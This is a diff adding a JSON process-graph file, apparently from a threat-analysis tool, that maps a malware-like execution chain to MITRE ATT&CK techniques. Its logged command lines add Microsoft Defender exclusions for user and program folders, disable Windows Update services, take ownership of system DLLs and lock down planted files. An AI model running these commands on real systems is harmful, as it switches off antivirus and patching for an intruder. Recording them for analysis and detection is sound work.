+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-Z5B8WrRx",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-Z5B8WrRxfHU8Nvo9qytQMQ",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:54.5618481Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-Z5B8WrRx-G8kmFE4C",
+        "source": "p-Z5B8WrRxfHU8Nvo9qytQMQ",
+        "target": "p-G8kmFE4CeaqshSkrd3L6Dg",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:55.2452532Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-k1LRPMZl",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-k1LRPMZlRWJjGRNs5QCeyA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:55.4905859Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" /grant:r Users:(RX) /deny Users:(DE)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-k1LRPMZl-o83YJWe9",
+        "source": "p-k1LRPMZlRWJjGRNs5QCeyA",
+        "target": "p-o83YJWe92PIu16f6mUOVkg",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:55.8250534Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" /grant:r Users:(RX) /deny Users:(DE)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-AWrs4wZo",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-AWrs4wZotJrVjSIMpBqOLQ",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:56.0920089Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\image.png\" /inheritance:r",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-xld6nFoo",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-xld6nFood9boi/IHmY9Etw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:56.4946603Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\image.png\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-xld6nFoo-v59v8cV1",
+        "source": "p-xld6nFood9boi/IHmY9Etw",
+        "target": "p-v59v8cV1RvsD26cJg18wnw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:56.7032172Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\\image.png\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-+BW4Xf3j",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-+BW4Xf3jJLAxgOUaoH4Sfw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:56.8882682Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\image.png\" /grant:r Users:(RX) /deny Users:(DE)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-+BW4Xf3j-4vVf94gi",
+        "source": "p-+BW4Xf3jJLAxgOUaoH4Sfw",
+        "target": "p-4vVf94giv04QxuJ8dOJ+Dg",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:57.2588015Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\\image.png\" /grant:r Users:(RX) /deny Users:(DE)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-YsT8NDxj",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-YsT8NDxjmZ6SubIALDu9dA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:57.4416539Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\thumbs.db\" /inheritance:r",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-7ytlVYBL",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-7ytlVYBLxNhquHT/hs2qhg",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:31:58.1682781Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\thumbs.db\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-7ytlVYBL-CL/TyDLM",
+        "source": "p-7ytlVYBLxNhquHT/hs2qhg",
+        "target": "p-CL/TyDLMCsJ6MsirFUdEfA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:00.6643265Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\\thumbs.db\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-DzcchMqg",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-DzcchMqgs4/UKSWQWx9H7g",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:03.1199981Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\thumbs.db\" /grant:r Users:(RX) /deny Users:(DE)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-DzcchMqg-7pi/2W02",
+        "source": "p-DzcchMqgs4/UKSWQWx9H7g",
+        "target": "p-7pi/2W02vMe2hfSp1TDbuA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:06.0396864Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\\thumbs.db\" /grant:r Users:(RX) /deny Users:(DE)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-t6Rum3m8",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-t6Rum3m809aTJ2gVQh+0Ow",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:07.4148004Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\XPSPLOG.dll\" /inheritance:r",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-3gFo6WWD",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-3gFo6WWD8alrcnRxdCUotw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:11.3195451Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\XPSPLOG.dll\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-3gFo6WWD-B7Dy6HYI",
+        "source": "p-3gFo6WWD8alrcnRxdCUotw",
+        "target": "p-B7Dy6HYInYSoeyrvo9kS6Q",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:13.0543216Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\\XPSPLOG.dll\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-1pYVzq7p",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-1pYVzq7pBK/pvL//9viwEQ",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:14.4548626Z",
+          "description": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\XPSPLOG.dll\" /grant:r Users:(RX) /deny Users:(DE)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-1pYVzq7p-rMVkaYn6",
+        "source": "p-1pYVzq7pBK/pvL//9viwEQ",
+        "target": "p-rMVkaYn6W2eYq4RFszIzqA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "icacls.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:15.8298377Z",
+          "description": "icacls  \"C:\\Program Files (x86)\\5FhqHn\\XPSPLOG.dll\" /grant:r Users:(RX) /deny Users:(DE)",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          }
+        }
+      },
+      {
+        "id": "e-HG4pzGin-sAQTadgc",
+        "source": "p-HG4pzGin01JEmVZGbvuRfQ",
+        "target": "p-sAQTadgcBjM6Nc/O8A3aDQ",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "net1.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:19.9185714Z",
+          "description": "C:\\Windows\\system32\\net1  stop uhssvc  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-LmG7U0ha-H01XpZ62",
+        "source": "p-LmG7U0ha0FPrJy6l6n4u+w",
+        "target": "p-H01XpZ625t7k3dYn19lplw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "net1.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:20.3954202Z",
+          "description": "C:\\Windows\\system32\\net1  stop WaaSMedicSvc  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-hEYA5Vl3",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-hEYA5Vl3F2lRFQ/N5b9Cmw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Defense Evasion",
+          "toolUsed": "powershell.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:26.9719989Z",
+          "description": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Add-MpPreference -ExclusionPath 'C:\\ProgramData','C:\\Users','C:\\Program Files (x86)' -Force",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1562.001",
+          "mitreAttackName": "Disable or Modify Tools",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1562.001",
+              "name": "Disable or Modify Tools"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-yoRuB0kz",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-yoRuB0kz8pCoJ0Q7JOsWug",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:33.371009Z",
+          "description": "cmd /c echo.>c:\\xxxx.ini",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-J2ZY0Ppx-3i0MsqIR",
+        "source": "p-J2ZY0PpxOl4cIMH1OSMQ0A",
+        "target": "p-3i0MsqIRnMGVoF1FhAx2ng",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Persistence",
+          "toolUsed": "cmd.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:42.6775865Z",
+          "description": "\"C:\\Windows\\System32\\cmd.exe\" cmd.exe /q /c \"@echo off & (for %i in (wuauserv UsoSvc uhssvc WaaSMedicSvc) do (     net stop %i >nul 2>&1 &     sc config %i start= disabled >nul 2>&1 &     sc failure %i reset= 0 actions= \"\" >nul 2>&1 )) & (for %i in (WaaSMedicSvc wuaueng) do (     takeown /f C:\\Windows\\System32\\%i.dll >nul 2>&1 &     icacls C:\\Windows\\System32\\%i.dll /grant *S-1-1-0:F >nul 2>&1 &  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1112",
+          "mitreAttackName": "Modify Registry",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1112",
+              "name": "Modify Registry"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-3i0MsqIR-V2QPDW3o",
+        "source": "p-3i0MsqIRnMGVoF1FhAx2ng",
+        "target": "p-V2QPDW3ox7IlBto5sydKVA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "net.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:43.6292068Z",
+          "description": "net  stop wuauserv  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-V2QPDW3o-dUrJm3OS",
+        "source": "p-V2QPDW3ox7IlBto5sydKVA",
+        "target": "p-dUrJm3OSydVembHcpVwH9Q",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "net1.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:43.8470978Z",
+          "description": "C:\\Windows\\system32\\net1  stop wuauserv  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-3i0MsqIR-yrjj5NRd",
+        "source": "p-3i0MsqIRnMGVoF1FhAx2ng",
+        "target": "p-yrjj5NRdsdauQBBqFSVU9Q",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "sc.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:46.6247992Z",
+          "description": "sc  config wuauserv start= disabled  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-3i0MsqIR-JMdYId4n",
+        "source": "p-3i0MsqIRnMGVoF1FhAx2ng",
+        "target": "p-JMdYId4n30KYRrAke9U9aw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "sc.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:46.8448621Z",
+          "description": "sc  failure wuauserv reset= 0 actions= \"\"  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-3i0MsqIR-mYiXdvBx",
+        "source": "p-3i0MsqIRnMGVoF1FhAx2ng",
+        "target": "p-mYiXdvBx5dr9dRR88DApzg",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "net.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:46.9417209Z",
+          "description": "net  stop UsoSvc  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-mYiXdvBx-LautZER+",
+        "source": "p-mYiXdvBx5dr9dRR88DApzg",
+        "target": "p-LautZER+4O45+ZfUsmmqpA",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "net1.exe",
+          "userUsed": "analyst",
+          "timestamp": "2026-08-08T17:32:47.0063595Z",
+          "description": "C:\\Windows\\system32\\net1  stop UsoSvc  ",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-9AOPGW9M-kbcVo2vy",
+        "source": "p-9AOPGW9MUPJrv/zoPl5J9w",
+        "target": "p-kbcVo2vyZIAZoGbKXjCrzw",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "reg.exe",
+          "userUsed": "SYSTEM",
+          "timestamp": "2026-08-08T17:33:07.302292Z",
+          "description": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\Program Files (x86)\\5FhqHn\" /t REG_DWORD /d 0 /f",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      },
+      {
+        "id": "e-HkQ8l8KK-IP3KLy3m",
+        "source": "p-HkQ8l8KKsNE1T5Qn6sT63Q",
+        "target": "p-IP3KLy3mQaNwpPgXZTHy3g",
+        "type": "customEdge",
+        "data": {
+          "label": "spawned",
+          "actionType": "Execution",
+          "toolUsed": "reg.exe",
+          "userUsed": "SYSTEM",
+          "timestamp": "2026-08-08T17:33:10.8705689Z",
+          "description": "reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v \"C:\\ProgramData\" /t REG_DWORD /d 0 /f",
+          "displaySettings": {
+            "showLabel": true,
+            "showActionType": true,
+            "showToolUsed": true,
+            "showUserUsed": false,
+            "showTimestamp": true,
+            "showMitreAttack": true,
+            "showDescription": false
+          },
+          "mitreAttackId": "T1059",
+          "mitreAttackName": "Command and Scripting Interpreter",
+          "mitreAttackTechniques": [
+            {
+              "id": "T1059",
+              "name": "Command and Scripting Interpreter"
+            }
+          ]
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 0.7
+    }
+  }
+}
